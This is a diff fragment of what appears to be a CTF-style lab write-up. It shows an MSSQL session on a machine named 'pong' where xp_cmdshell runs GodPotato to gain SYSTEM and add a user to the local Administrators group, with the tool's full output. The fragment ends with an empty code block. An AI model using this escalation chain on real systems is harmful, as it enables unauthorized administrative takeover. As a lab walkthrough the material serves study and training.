@@ -983,4 +983,45 @@ SQL (pong\P.Reiner  dbo@master)>
 
 Then i can execute commands as SYSTEM
 
+```python
+SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\GodPotato-NET4.exe -cmd "net localgroup Administrators c.carlssen /add"
+output                                                                             
+--------------------------------------------------------------------------------   
+[*] CombaseModule: 0x140728540921856                                               
+[*] DispatchTable: 0x140728543508808                                               
+[*] UseProtseqFunction: 0x140728542801440                                          
+[*] UseProtseqFunctionParamCount: 6                                                
+[*] HookRPC                                                                        
+[*] Start PipeServer                                                               
+[*] CreateNamedPipe \\.\pipe\336aa63b-e3f9-4a42-82cd-2b6aebcec4d3\pipe\epmapper    
+[*] Trigger RPCSS                                                                  
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                            
+[*] DCOM obj IPID: 00007c02-0e14-ffff-af2a-c0c052aa153c                            
+[*] DCOM obj OXID: 0x7b6f55b2ba3f5196                                              
+[*] DCOM obj OID: 0xa115499260639e43                                               
+[*] DCOM obj Flags: 0x281                                                          
+[*] DCOM obj PublicRefs: 0x0                                                       
+[*] Marshal Object bytes len: 100                                                  
+[*] UnMarshal Object                                                               
+[*] Pipe Connected!                                                                
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                      
+[*] CurrentsImpersonationLevel: Impersonation                                      
+[*] Start Search System Token                                                      
+[*] PID : 888 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
+[*] Find System Token : True                                                       
+[*] UnmarshalObject: 0x80070776                                                    
+[*] CurrentUser: NT AUTHORITY\SYSTEM                                               
+[*] process start with pid 3664                                                    
+The command completed successfully.                                                
+NULL                                                                               
+NULL                                                                               
+SQL (pong\P.Reiner  dbo@master)> 
+```
 
+Ill then add `c.carlssen` to the administrators group
+
+Then after logging out of winrm and logging back in.....
+
+```python
+
+```
